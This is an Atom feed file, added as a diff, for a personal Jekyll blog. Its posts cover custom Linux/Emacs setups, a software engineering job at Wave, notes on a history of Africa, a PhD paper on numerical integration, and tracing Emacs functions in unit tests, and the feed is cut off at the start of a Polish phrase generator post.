@@ -1,0 +1,705 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-06-05T07:01:42+01:00</updated><id>/feed.xml</id><title type="html">Typical Technological Trickery</title><entry><title type="html">Are custom dev setups worthwhile?</title><link href="/are-custom-dev-setups-worthwhile.html" rel="alternate" type="text/html" title="Are custom dev setups worthwhile?" /><published>2021-11-20T00:00:00+00:00</published><updated>2021-11-20T00:00:00+00:00</updated><id>/are-custom-dev-setups-worthwhile</id><content type="html" xml:base="/are-custom-dev-setups-worthwhile.html">&lt;p&gt;I work on a heavily customised version of Ubuntu which I treat a bit like Arch
+Linux but with more stable packages (i.e. custom X session with no GNOME etc,
+only running what I configure). I also use Emacs with a lot of configuration for
+almost all of my programming work. I was nudged down this path by &lt;a href=&quot;https://nakamotoinstitute.org/static/docs/taoup.pdf&quot;&gt;The Art of
+Unix Programming&lt;/a&gt;, and I
+assumed that it would pay off but didn’t have much real foresight on the issue.
+In retrospect this kind of setup has some tradeoffs so I’m often unsure whether
+to recommend that younger engineers do something similar or stick with more
+standardised tools.&lt;/p&gt;
+
+&lt;p&gt;Being willing to put some effort into customising your setup can get you some
+nice benefits, e.g.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Tiling window managers to remove a lot of fiddling with window layouts.&lt;/li&gt;
+  &lt;li&gt;Hotkeys for the tools and commands that you use the most (e.g. opening your
+todo list in a new editor window with one keystroke).&lt;/li&gt;
+  &lt;li&gt;If using a mouse causes you RSI problems, no problem: configure things such
+that you rarely need to use one.&lt;/li&gt;
+  &lt;li&gt;You can choose to only use applications with a text-based configuration, store
+all of the files in git, and so be able to configure a new machine to work
+exactly the same way in minutes.&lt;/li&gt;
+  &lt;li&gt;You can use a more RSI-friendly keyboard layout (Colemak!) and rebind keys to
+be sensible in the alternative layout.&lt;/li&gt;
+  &lt;li&gt;You also gain the ability to quickly experiment with new ideas. Because you
+already understand the basics additional configuration is easy.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;But maybe the most important thing is the knowledge that you get along the way.
+In customising your environment you are forced to learn all sorts of little
+things which can pay off later. I first learned about systemd, bash scripting,
+udev, makefiles and much more in this way. All of these examples have been
+useful in my day job. Learning about such things while trying to make your
+window manager do something neat is much more fun and rewarding than learning
+them from books or exercises. In fact I suspect almost no-one learns this stuff
+in an academic way because it would be so dull!&lt;/p&gt;
+
+&lt;p&gt;You also gain more abstract knowledge too. The practice of customising your
+environment pushes you to work closely with a wide variety of software written
+in a wide variety of languages. This exposes you to various philosophies on
+configuration, updating, compilation, dependency management, correctness etc.
+For example you gain an appreciation for simple interfaces and code because it
+makes your life eaisier. You get to see how different styles of typechecking and
+auotmated testing play out in terms of how reliable the software is (spoiler:
+old untested lisp code often doesn’t do as well as e.g. well tested Haskell).&lt;/p&gt;
+
+&lt;p&gt;Along the same lines, you are pushed to experiment with multiple languages. My
+go to languages for real work are python, C++, and javascript, but through
+environment configuration I’ve had plenty of exposure to outliers like lisp,
+Haskell and bash. This makes it easier to understand new languages or language
+features e.g. my prior experience with lisp made it particularly easy for me to
+understand javascript well.&lt;/p&gt;
+
+&lt;p&gt;One downside of all this is that it takes some work. As long as it’s still fun
+this isn’t a problem, but sometimes these days I just want my computers to work
+without needing to think about anything. An example: my laptop doesn’t currently
+autodetect external monitors. I know that I could write a udev rule to
+automatically run the appropriate xrandr command but I haven’t bothered yet. So
+2.5 years after switching from a desktop to a laptop I still run a command
+whenever I plug in a monitor.&lt;/p&gt;
+
+&lt;p&gt;Another is that sometimes you just have to live with something a little janky.
+In my case I wanted a status bar containing live graphs of CPU/memory/disk and
+applets for wifi, volume, skype, etc. But I couldn’t find anything that supports
+both so I’m actually running two status bars that look like they are one. This
+is fine except that depending on the screen size there can be a slight gap or
+overlap between them. Purely an aesthetic issue, but annoying nonetheless.&lt;/p&gt;
+
+&lt;p&gt;But maybe the biggest downside: the more standard your environment is the more
+you can benefit from economies of scale in getting new features and keeping
+everything bug-free. For example this seems to be happening with VS code - any
+new text editing idea is quickly added to VS code, but sometimes they take
+longer to reach Emacs (and longer still for a high quality version). Similarly
+when you work for a sufficiently large company they will likely have some
+engineers working on tooling and the more standard your enviroment is the more
+you can benefit from this.&lt;/p&gt;
+
+&lt;p&gt;An aside: some people avoid doing a lot of custom configuration because they
+want to be able to work easily on other people’s computers. I haven’t found this
+to be an issue yet: I’ve probably spent double-digit hours working on other
+people’s computers vs &amp;gt;20,000 hours on mine!&lt;/p&gt;
+
+&lt;p&gt;So to sum it up: maybe. Some configuration is probably worth the effort (e.g.
+tiling window managers and custom OS-level hotkeys are low effort, high payoff
+and easy to maintain), others might not be worthwhile directly (e.g. &lt;a href=&quot;https://github.com/davidshepherd7/electric-operator/&quot;&gt;writing
+your own Emacs package to do
+autoformatting&lt;/a&gt;). But
+aside from the direct benefits, tinkering with computers and programming for fun
+outside of work can teach you a lot. If you find configuring your environment
+fun then it is a great way to learn!&lt;/p&gt;</content><author><name></name></author><summary type="html">I work on a heavily customised version of Ubuntu which I treat a bit like Arch Linux but with more stable packages (i.e. custom X session with no GNOME etc, only running what I configure). I also use Emacs with a lot of configuration for almost all of my programming work. I was nudged down this path by The Art of Unix Programming, and I assumed that it would pay off but didn’t have much real foresight on the issue. In retrospect this kind of setup has some tradeoffs so I’m often unsure whether to recommend that younger engineers do something similar or stick with more standardised tools.</summary></entry><entry><title type="html">Writing about my job: Software Engineer at Wave</title><link href="/writing-about-my-job.html" rel="alternate" type="text/html" title="Writing about my job: Software Engineer at Wave" /><published>2021-08-13T00:00:00+01:00</published><updated>2021-08-13T00:00:00+01:00</updated><id>/writing-about-my-job</id><content type="html" xml:base="/writing-about-my-job.html">&lt;p&gt;In response to &lt;a href=&quot;https://forum.effectivealtruism.org/posts/nf72oiJddwDhoJ4QH/you-should-write-about-your-job&quot;&gt;Aaron Gertler’s prompt on the EA
+forum&lt;/a&gt;
+I’m writing a bit about my job. I hope this will be useful to people who are
+considering software engineering as a career path and EA software engineers who
+are in positions where their work is not EA relevant.&lt;/p&gt;
+
+&lt;p&gt;This post is cross posted from the &lt;a href=&quot;https://forum.effectivealtruism.org/posts/pyvybGkGYaFAeNtGi/writing-about-my-job-software-engineer-at-wave&quot;&gt;EA forum&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;the-basics&quot;&gt;The basics&lt;/h1&gt;
+
+&lt;p&gt;I work as a lead software engineer for &lt;a href=&quot;https://www.wave.com/en/&quot;&gt;Wave mobile
+money&lt;/a&gt;. We’re working to build radically inclusive and
+affordable financial infrastructure in sub-Saharan Africa. My job is a mixture
+of programming, mentoring/leading other engineers on my team, and a bit of
+product design work. I work full remotely from Manchester, UK.&lt;/p&gt;
+
+&lt;p&gt;The job is EA-relevant in two ways:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Directly - Wave is dramatically cheaper than competitors, so we save people a
+lot of money for people who often don’t have much money in the first place.
+My rough estimate for the reduction in fees vs competitors is 20 million USD
+per month, and we’re growing so this is constantly increasing!&lt;/p&gt;
+
+    &lt;p&gt;Less concretely there are also benefits from having a reliable, fast, and
+widely used mobile-money network available, see e.g.
+&lt;a href=&quot;https://www.wave.com/en/blog/world/&quot;&gt;link&lt;/a&gt; or
+&lt;a href=&quot;https://www.jefftk.com/p/estimating-the-value-of-mobile-money&quot;&gt;link&lt;/a&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Donations - with most jobs pay is heavily location dependent, but I’m not
+willing to make the sacrifice of living somewhere that will leave me isolated
+from my friends and family in order to earn more money. Wave’s pay is
+(almost) location-independent so as a European software engineer working for
+Wave allows me to donate substantially more than I would otherwise. It’s
+roughly 3x-10x+ depending on how much the equity ends up being worth. Wave
+also matches donations up to $10,000 per year which adds another ~1x.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Of these two I think the direct work is probably the more valuable part: even
+taking the fee savings alone and dividing evenly over all Wave employees would
+be around 500K USD per Wave employee per year. But a software engineering role
+probably contributes more than say a callcenter role so my contribution is
+probably more than that. Then there’s the potential for massive continued growth
+of Wave which could amplify the impact of work done now by 10-100x.&lt;/p&gt;
+
+&lt;p&gt;It’s not completely clear-cut though since 1. the largest fee savings/mobile
+money network benefits will probably go to richer people and 2. GiveWell
+estimates AMF donations to be around &lt;a href=&quot;https://docs.google.com/spreadsheets/d/11HsJLpq0Suf3SK_PmzzWpK1tr_BTd364j0l3xVvSCQw/edit#gid=1364064522&amp;amp;range=B215&quot;&gt;10x more
+valuable&lt;/a&gt;
+than cash transfers.&lt;/p&gt;
+
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;/h1&gt;
+
+&lt;p&gt;I think there’s a pretty standard route to getting a software job (i.e. STEM or
+CS degree then junior eng role, maybe with some self-driven learning or a
+bootcamp first), but I’ll describe my path anyway because it was slightly
+non-standard:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Maths and Physics undergraduate - I think this was very helpful in getting the
+right mindset for software engineering and learning hard things in general,
+but only a tiny fraction of what I learned during my undergraduate is actually
+relevant to my job.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;PhD in computational physics - this is when I really learned to program well.
+I was working on large complex software so I was forced to use proper software
+engineering best practices to be able to deal with it. I think this was a big
+help in getting to where I am now. Still not sure if I would recommend doing a
+PhD though: it was definitely bad for my mental health.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;4 years as a software engineer at Biosite - more technical skills, and general
+software work experience. Also my introduction to the idea of prioritising
+work based on impact rather than just trying to do everything at once. (Really
+wish I’d been pushed to think about this more during my PhD!)&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;As well as the above I’ve spent a lot of time (a few hours a week for ~6 years)
+writing open source software for fun in my spare time and reading books on the
+subject. I think this probably helped to prepare me for the job as much or more
+than my undergraduate degree. Possibly even more than a CS undergraduate would
+have done.&lt;/p&gt;
+
+&lt;h1 id=&quot;application-process&quot;&gt;Application process&lt;/h1&gt;
+
+&lt;p&gt;Disclaimer: this is written from memory from 2 years ago, I might not have got
+everything right.&lt;/p&gt;
+
+&lt;p&gt;The application process took a fairly typical amount of work for a software job
+in my experience. It took around 10-12 hours total (including prep) over 4
+parts: 2 coding exercises and 2 chats. Everyone I interacted with was friendly
+and pleasant throughout, I think it would have been a positive experience even
+if I didn’t get the job.&lt;/p&gt;
+
+&lt;p&gt;The first chat was just a general intro to Wave and opportunity to ask
+questions. I didn’t explicitly prep for this but I had a few questions anyway. In
+retrospect I probably should have spent some time thinking of more questions.&lt;/p&gt;
+
+&lt;p&gt;Then there were the programming exercises. These were both intense but fun, I
+think it was around 6 hours total + a couple of hours prep. At the time the
+recommended prep was something fairly wishy-washy like “think about how to solve
+the problem but don’t write any code” (I think this has changed since). So I did
+this recommended prep and I also made sure I was familiar with all the
+technologies that I would be using by writing a quick implementation of some
+trivial application with same language and framework. I think I’m happy with the
+amount of prep that I did. I found out afterwards that I did fine on both of the
+exercises, but while I was doing them I felt like there wasn’t enough time to
+fully solve the exercise (this was probably intentional). That was what made it
+feel intense.&lt;/p&gt;
+
+&lt;p&gt;Finally there was the last interview with one of the founders. I think this was
+a final check for culture fit, we talked about things along the lines of why I
+wanted to work for Wave, what motivates me in general, etc. As with the other
+chat I didn’t really spend any time prepping for this and maybe I should have
+done something more.&lt;/p&gt;
+
+&lt;p&gt;Pretty quickly after the last interview (I think it was same or next day) I got
+a job offer. I took a day or so to think it through to be completely sure that
+it was what I wanted, but really there was no way I was going to say no!&lt;/p&gt;
+
+&lt;p&gt;I applied for another job at the same time as I applied for Wave. The other job
+was some boring corporate transportation arranging startup who rejected me (one
+of the reasons was because I didn’t seem excited enough about their product, so
+I guess they got that right!). Their application process was fairly similar to
+the Wave one. Doing two applications at once was manageable but I don’t think I
+could have handled more than 3 applications while also working full time.&lt;/p&gt;
+
+&lt;h1 id=&quot;what-the-job-is-like&quot;&gt;What the job is like&lt;/h1&gt;
+
+&lt;h2 id=&quot;what-i-spend-my-time-on&quot;&gt;What I spend my time on&lt;/h2&gt;
+
+&lt;p&gt;This varies a lot from week-to-week, but as a rough estimate:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;~40% of my time writing code&lt;/li&gt;
+  &lt;li&gt;~25% of my time on supporting/mentoring the other software engineers on my
+team - helping them with any tricky problems, giving guidance on technical
+designs, etc.&lt;/li&gt;
+  &lt;li&gt;~25% of my time working on product design problems - digging into data to
+answer questions or look for issues; working out how to make new features easy
+to use, secure, and reliable.&lt;/li&gt;
+  &lt;li&gt;~10% of my time arranging other things - trying to make sure all of the pieces
+are in place for projects to go smoothly, ensuring that the right people are
+talking to each other, etc.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I’m the tech lead for my team, so most software engineers spend less time on
+mentoring/product/arranging things and more on writing code than I do. But Wave
+generally encourages all engineers to get involved in product decisions and take
+full ownership over the problems they are solving, so there might still be more
+non-programming work than at other companies.&lt;/p&gt;
+
+&lt;p&gt;More specifically: I work on the integrations team, where we build features that
+interact with systems run by other companies. The most common example of this
+kind of feature is enabling users to pay their bills in the Wave app. This might
+sound simple and boring but (for better or worse) many of our partners have very
+idiosyncratic APIs. So every new integration is an interesting challenge in
+figuring how we can adapt to the specific functionality and requirements of that
+particular API.&lt;/p&gt;
+
+&lt;h2 id=&quot;pros&quot;&gt;Pros&lt;/h2&gt;
+
+&lt;p&gt;For Wave in particular:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;I get to directly work on solving really important problems for people (e.g.
+allowing people to cheaply pay their bills from their phone instead of walking
+miles to an agency or paying large fees). This kind of work doesn’t seem to be
+possible in developed world software because all of the low-hanging fruit has
+already been picked so you just work on making cat pictures load faster or
+making someone else’s job slightly more efficient, etc.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;We’re growing absurdly quickly, during my time at Wave we’ve gone from being a
+tiny company that no-one had heard of to the majority of adults in Senegal
+being Wave users (and we’ve since launched in other countries too). This is
+incredibly exciting to watch unfold.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The work environment is great - my colleagues are some of the most friendly
+and supportive people I’ve met, looking after yourself is widely encouraged.
+They’re also some of the smartest people I’ve ever met.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For software engineering in general:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;It’s an interesting and intellectually challenging role. There are more
+challenging roles, but I find that software engineering has a nice balance
+between “hard enough to be interesting” and “so hard you fail all the time”.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The compensation is good, although it’s usually only really really good in
+particular cities.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;cons&quot;&gt;Cons&lt;/h2&gt;
+
+&lt;p&gt;For Wave in particular:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Fully remote work can be isolating, this is usually counteracted by regular
+company trips to the countries where we operate but covid has obviously
+suspended that.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Working on technology in Africa can be… challenging, e.g. there are few/no
+datacenters - you either run your own machines or use hardware on another
+continent; the reliability of everything is relatively low - power and
+internet outages happen semi-regularly both for us and for our partner
+companies; the regulatory environment can be confusing, bureaucratic, and/or
+ineffective.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For software engineering in general: it definitely requires a love of and
+aptitude for learning about technical subjects.&lt;/p&gt;
+
+&lt;h1 id=&quot;contact-mehiring&quot;&gt;Contact me/hiring&lt;/h1&gt;
+
+&lt;p&gt;If you have any follow up questions feel free to post them on the EA forum or
+email me about them.&lt;/p&gt;
+
+&lt;p&gt;We’re currently hiring software engineers, product managers, and a bunch of
+other remote positions. So if any of what I’ve described sounds like something
+you would be interested in doing then please reach out and/or check out &lt;a href=&quot;https://www.wave.com/en/careers/#roles&quot;&gt;our
+jobs page&lt;/a&gt;.&lt;/p&gt;
+
+&lt;!--  LocalWords:  Gertler's
+ --&gt;</content><author><name></name></author><category term="wave" /><category term="ea" /><category term="jobs" /><summary type="html">In response to Aaron Gertler’s prompt on the EA forum I’m writing a bit about my job. I hope this will be useful to people who are considering software engineering as a career path and EA software engineers who are in positions where their work is not EA relevant.</summary></entry><entry><title type="html">Notes from “Africa: a biography of the continent” by John Reader</title><link href="/notes-from-africa-biography-of-a-continent.html" rel="alternate" type="text/html" title="Notes from “Africa: a biography of the continent” by John Reader" /><published>2020-05-02T00:00:00+01:00</published><updated>2020-05-02T00:00:00+01:00</updated><id>/notes-from-africa-biography-of-a-continent</id><content type="html" xml:base="/notes-from-africa-biography-of-a-continent.html">&lt;p&gt;I read this book over the last few months hoping to get some more insight into
+African history. It’s a great book and very readable, although some parts drag
+on a bit or repeat things (I skimmed over a few pages).&lt;/p&gt;
+
+&lt;p&gt;While reading I realised I was learning so many interesting things that I
+decided to keep notes so that I wouldn’t forget them all. I wasn’t originally
+intending to share them anywhere so they aren’t necessarily very well written.&lt;/p&gt;
+
+&lt;p&gt;Everything here is according to the book, obviously I don’t know much about
+African history (otherwise I wouldn’t need to read a book about it) so there
+might be things which are misleading or even plain wrong and I wouldn’t have
+been able to spot them.&lt;/p&gt;
+
+&lt;h1 id=&quot;early-chapters&quot;&gt;Early chapters&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;Africa is the oldest continent to have its current form, others had more recent geological events create/affect them.&lt;/li&gt;
+  &lt;li&gt;Humanity began in Africa&lt;/li&gt;
+  &lt;li&gt;Life itself began in Africa!&lt;/li&gt;
+  &lt;li&gt;Languages in Africa have a lot more diversity: non African languages are all somewhat related to each other because they branched off the tree later.&lt;/li&gt;
+  &lt;li&gt;The sahara was fertile until the last ice age when changes in ocean currents reduced rainfall!&lt;/li&gt;
+  &lt;li&gt;Humans standing upright was probably a way to regulate body temperature, and happened before brain size increase or tool use! Standing up means less body exposed to the sun (so less radiative heating and more bare skin which can sweat better b/c you don’t need fur to protect from uv on skin which isn’t exposed to the sun) and more breezy. Humans are better than other mammals in high temp as long as we get enough water!&lt;/li&gt;
+  &lt;li&gt;Law of the minimum: the resource that is the least readily available is the one that limits growth.&lt;/li&gt;
+  &lt;li&gt;Various pre-homo sapian humans explored outside Africa but died out.&lt;/li&gt;
+  &lt;li&gt;There is a family of languages called Bantu which is spoken all over Africa.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;african-civilizations&quot;&gt;African civilizations&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;There was a major civilization in Ethiopia at Aksum around the same time as Rome and of comparable influence!&lt;/li&gt;
+  &lt;li&gt;It was on a plataeu which lowered the temperature and increased rainfall, making it more hospitable than most of the rest of Africa.&lt;/li&gt;
+  &lt;li&gt;The plateau was a natural fortress: mountainous on 3 sides and desert on the other.&lt;/li&gt;
+  &lt;li&gt;One of the main causes of its downfall was deforestation (b/c rain leached the soil and reduced food production).&lt;/li&gt;
+  &lt;li&gt;They built massive monuments called stele, gigantic chunks of carved solid rock, which still exist.&lt;/li&gt;
+  &lt;li&gt;Ethiopians believe that Aksum rulers interacted with ancient biblical figures, but the timelines are all wrong.&lt;/li&gt;
+  &lt;li&gt;There was a civilization on the inland Niger delta which didn’t have any rulers/upper classes/etc. They were mostly subsistence farmers but it was so hard that they all had to rely on each other a lot. Being “nice” was basically mandatory for survival so it got embedded deeply into their culture. Also interesting: they lived in ~30 mini-towns all near to each other to walk between but firmly separated by less solid ground in between.&lt;/li&gt;
+  &lt;li&gt;Elephants used to seriously compete with humans for resources. They would raid farms and eat all the food! Governments paid people to hunt them but they still couldn’t keep the numbers down until more recently when all the elephant habits were destroyed.&lt;/li&gt;
+  &lt;li&gt;Using animals for farming in sub-saharan Africa was basically useless because they needed to eat more calories than they could help to grow. Different to Europe because of the kinds of crops possible, more rapidly growing weeds, and hard to plough soil.&lt;/li&gt;
+  &lt;li&gt;Many societies in SSA used to have a gerontocratic power system (old people ruling). This made for stable, peaceful, but very conservative societies.&lt;/li&gt;
+  &lt;li&gt;Lake victoria is a gigantic lake between kenya, uganda, and tanzania. It’s the source of the nile.&lt;/li&gt;
+  &lt;li&gt;Bananas are so easy to grow that when they were introduced to certain regions of Africa they caused massive population growth due to more food being available.&lt;/li&gt;
+  &lt;li&gt;Stupid white explorers assumed that any elite groups in Africa had to be descended from europeans and came up with convoluted explanations for this to happen.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;foreign-influences&quot;&gt;Foreign influences&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;The initial exploration/exploitation of Africa by Europeans was by the Portugese. They sailed all the way around it eventually, looking to bypass other countries and get to the indies.&lt;/li&gt;
+  &lt;li&gt;A lot of the initial slave trade was Africans selling other Africans to Europeans (for lack of anything else to sell to buy European goods).&lt;/li&gt;
+  &lt;li&gt;The Portugese empire eventually collapsed due to lack of manpower.&lt;/li&gt;
+  &lt;li&gt;Cowerie shells were used as currency for a long time. They were tough, light, and hard enough to get hold of on the African mainland that this made sense!&lt;/li&gt;
+  &lt;li&gt;The maldives were possible to live on because they were a great source of cowerie shells, so people living there could buy food etc with them.&lt;/li&gt;
+  &lt;li&gt;Even after the atlantic slave trade was abolished, it continued within Africa. People used slaves to grow crops etc and sold the crops to Europeans instead.&lt;/li&gt;
+  &lt;li&gt;Droughts increased slavery because desparate people would give &lt;em&gt;themselves&lt;/em&gt; into slavery to be fed.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;the-scramble&quot;&gt;The scramble&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;A couple of different european explorers made expeditions across Africa, but at a big cost in the lives of their African and European helpers.&lt;/li&gt;
+  &lt;li&gt;The Congo began as a supposedly philanthropic endeavour to ‘civilise’ central Africa.&lt;/li&gt;
+  &lt;li&gt;The Belgian king decided he wanted his own personal colony, lots of political machinations and throwing money around and he got it.&lt;/li&gt;
+  &lt;li&gt;At first the Congo ‘free’ state was a massive money sink, but then tires were invented, demand for rubber soared, and it started making huge profits from exported rubber.&lt;/li&gt;
+  &lt;li&gt;But: the methods used were horrific. They dictated that the natives (who didn’t have any choice in becoming part of this ‘country’) work for them gathering rubber as ‘taxes’. High quotas were enforced with violence.&lt;/li&gt;
+  &lt;li&gt;Unsurprisingly this didn’t go well longer term:within 5 years or so there was massive depopulation (presumably both deaths and migration) and environmental destruction.&lt;/li&gt;
+  &lt;li&gt;The profits all went into development of Europe, obviously…&lt;/li&gt;
+  &lt;li&gt;All of the national borders in Africa divide ethnic groups and resources in stupid ways because they were drawn up by Europeans.&lt;/li&gt;
+  &lt;li&gt;Border areas are relatively badly served by most infrastructure: the core infrastructure of the country they are in is far away and they aren’t allowed to use the neighbouring country’s.&lt;/li&gt;
+  &lt;li&gt;Most colonies weren’t actually productive at all (Rhoesia never made any money, the German colonies only lasted for 30 years and had major economic problems).&lt;/li&gt;
+  &lt;li&gt;Germany had colonies! I didn’t know that. &lt;del&gt;They were actually treated comparatively well too&lt;/del&gt;. The book doesn’t mention it but &lt;a href=&quot;https://en.wikipedia.org/wiki/German_colonial_empire#Rebellions_and_genocide&quot;&gt;the German military committed genocide  in what is now Namibia&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;post-world-war-2&quot;&gt;Post world war 2&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;After WW1/2 people started to want to free the colonies (anit-facism, increase in American power and America being an ex-colony, Africans helped a lot during the war).&lt;/li&gt;
+  &lt;li&gt;The initial idea was to slowly transfer power over decades, but various nationalist movements started rioting etc and so power transfers happened very quickly.&lt;/li&gt;
+  &lt;li&gt;This is probably why there have been so many political problems in Africa recently (uneducated population with no experience in democracy suddenly ask to elect leaders from among themselves).&lt;/li&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="africa" /><summary type="html">I read this book over the last few months hoping to get some more insight into African history. It’s a great book and very readable, although some parts drag on a bit or repeat things (I skimmed over a few pages).</summary></entry><entry><title type="html">Publication: Adaptive-step implicit-midpoint-rule for time integration</title><link href="/adaptive-imr-paper.html" rel="alternate" type="text/html" title="Publication: Adaptive-step implicit-midpoint-rule for time integration" /><published>2019-05-24T00:00:00+01:00</published><updated>2019-05-24T00:00:00+01:00</updated><id>/adaptive-imr-paper</id><content type="html" xml:base="/adaptive-imr-paper.html">&lt;p&gt;The main paper from my PhD has finally made it through the publication
+process, and is available
+&lt;a href=&quot;https://link.springer.com/article/10.1007/s10915-019-00965-8&quot;&gt;here&lt;/a&gt;
+(it’s open access so you don’t need an expensive subscription to read
+it).&lt;/p&gt;
+
+&lt;p&gt;The abstract is:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The implicit mid-point rule is a Runge–Kutta numerical integrator for
+the solution of initial value problems, which possesses important
+properties that are relevant in micromagnetic simulations based on the
+Landau–Lifshitz–Gilbert equation, because it conserves the
+magnetization length and accurately reproduces the energy balance
+(i.e. preserves the geometric properties of the solution). We present
+an adaptive step size version of the integrator by introducing a
+suitable local truncation error estimator in the context of a
+predictor-corrector scheme. We demonstrate on a number of relevant
+examples that the selected step sizes in the adaptive algorithm are
+comparable to the widely used adaptive second-order integrators, such
+as the backward differentiation formula (BDF2) and the trapezoidal
+rule. The proposed algorithm is suitable for a wider class of
+non-linear problems, which are linearised by Newton’s method and
+require the preservation of geometric properties in the numerical
+solution.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In plain English: I took an algorithm which has some useful properties
+for simulating magnetic materials and found a way to make it faster
+without losing those properties. Hopefully it will turn out to be
+useful in other areas of computational physics too, but I didn’t have
+time to look into that.&lt;/p&gt;</content><author><name></name></author><summary type="html">The main paper from my PhD has finally made it through the publication process, and is available here (it’s open access so you don’t need an expensive subscription to read it).</summary></entry><entry><title type="html">Tracing macros in Emacs</title><link href="/emacs-tracing-functions.html" rel="alternate" type="text/html" title="Tracing macros in Emacs" /><published>2018-03-30T00:00:00+01:00</published><updated>2018-03-30T00:00:00+01:00</updated><id>/emacs-tracing-functions</id><content type="html" xml:base="/emacs-tracing-functions.html">&lt;p&gt;I’ve been playing around in common lisp lately, and one feature I particularly
+like is the trace macro. &lt;code&gt;trace&lt;/code&gt; is a macro which lets you easily log the
+arguments and result of all calls to a function. It’s particularly handy for
+visualising recursive function calls.&lt;/p&gt;
+
+&lt;p&gt;As you might expect Emacs has an equivalent macro. It’s called &lt;code&gt;trace-function&lt;/code&gt;
+and is used like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(defun fact (n)
+  (if (= n 0) 1
+    (* n (fact (1- n)))))
+
+(trace-function #'fact)
+
+(fact 3)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;which pops up a &lt;code&gt;*trace-output*&lt;/code&gt; buffer containing&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;======================================================================
+1 -&amp;gt; (fact 3)
+| 2 -&amp;gt; (fact 2)
+| | 3 -&amp;gt; (fact 1)
+| | | 4 -&amp;gt; (fact 0)
+| | | 4 &amp;lt;- fact: 1
+| | 3 &amp;lt;- fact: 1
+| 2 &amp;lt;- fact: 2
+1 &amp;lt;- fact: 6
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is great if you’re working interactively, but I want to use it for
+debugging unit tests too. I run typically tests in batch mode using
+&lt;a href=&quot;https://github.com/rejeep/ert-runner.el&quot;&gt;ert-runner&lt;/a&gt;, so the challenge is to
+get the trace macro to print to stdout instead of writing to a buffer.&lt;/p&gt;
+
+&lt;p&gt;Unfortunately Emacs doesn’t have a simple way of redirecting a buffer to stdout.
+My somewhat hacky solution is to add the following code to my ert-runner
+&lt;code&gt;test-helper.el&lt;/code&gt; file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(defun log-trace-buffer (&amp;amp;rest _)
+  (when (get-buffer trace-buffer)
+    (with-current-buffer trace-buffer
+      (message (buffer-substring-no-properties (point-min) (point-max))))))
+(add-to-list 'ert-runner-reporter-run-ended-functions #'log-trace-buffer)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;which just dumps the entire contents of the trace output buffer to stdout when
+the tests finish. It’s not perfect but it’s enough for me to fix my tests!&lt;/p&gt;</content><author><name></name></author><category term="emacs" /><category term="common-lisp" /><category term="debugging" /><summary type="html">I’ve been playing around in common lisp lately, and one feature I particularly like is the trace macro. trace is a macro which lets you easily log the arguments and result of all calls to a function. It’s particularly handy for visualising recursive function calls.</summary></entry><entry><title type="html">Polish nonsense phrase generator</title><link href="/polish-generator.html" rel="alternate" type="text/html" title="Polish nonsense phrase generator" /><published>2018-03-10T00:00:00+00:00</published><updated>2018-03-10T00:00:00+00:00</updated><id>/polish-generator</id><content type="html" xml:base="/polish-generator.html">&lt;h2 id=&quot;polish-nonesense-phrase-generator&quot;&gt;Polish nonesense phrase generator&lt;/h2&gt;
+
+&lt;div class=&quot;jumbotron&quot; style=&quot;margin-top: 1em&quot;&gt;
